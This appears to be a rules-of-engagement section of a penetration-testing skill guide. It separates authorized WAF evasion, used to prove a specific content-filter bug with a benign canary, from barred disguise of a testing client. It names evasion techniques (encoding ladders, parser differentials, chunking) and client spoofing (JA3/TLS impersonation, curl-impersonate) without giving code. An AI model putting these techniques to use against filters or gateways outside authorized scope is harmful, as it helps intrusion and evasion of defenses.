## Extended arsenal — the boundary: authorized evasion-to-exploit vs barred client disguise

# Two things look similar on the wire and must never be conflated. Keep this boundary crisp and consistent with
# `_contract/roe-gate.md` + `_contract/anti-automation-ladder.md`.

| | Authorized evasion-to-exploit (THIS skill, Phase 2) | Barred client disguise (NOT this skill) |
|---|---|---|
| Purpose | Prove a SPECIFIC benign canary (hence a specific bug) is reachable past a CONTENT filter | Slip a scripted client past a gateway / bot / reputation gate during ordinary testing |
| Techniques | encoding ladders, normalization/parser-differential, chunking, casing, alternate content-types | browser/JA3 impersonation, client-fingerprint spoofing, un-banning a burned egress by disguise |
| Gate | RoE must AUTHORIZE evasion; recorded (roe-gate.md §2) before climbing the ladder | Barred outright by roe-gate.md + the anti-automation ladder — no authorization makes it in-scope here |
| Target | the in-scope app's filter, to reach ITS bug | the WAF/gateway itself — treating a platform defense as the objective |

# Not a license to BRUTE the WAF: the goal is the lowest transform that gets an already-BENIGN canary to its
# sink, not thousands of mutations hammering the filter (that is both noise and a reputation-ban risk).
#
# On the TLS/JA3 + curl-impersonate levers catalogued above (sections 1, 5, tooling): these are legitimate
# ONLY inside authorized evasion-to-exploit serving a specific content-filter bug — NEVER to normalize getting
# a scraper past a bot/rate gate during ordinary testing, and NEVER to disguise a banned client back onto a
# reputation gate. When in doubt, the test is: am I proving a SPECIFIC bug past a CONTENT filter (OK, if
# RoE-authorized), or am I making my client look like something it isn't to beat a GATEWAY (barred)?
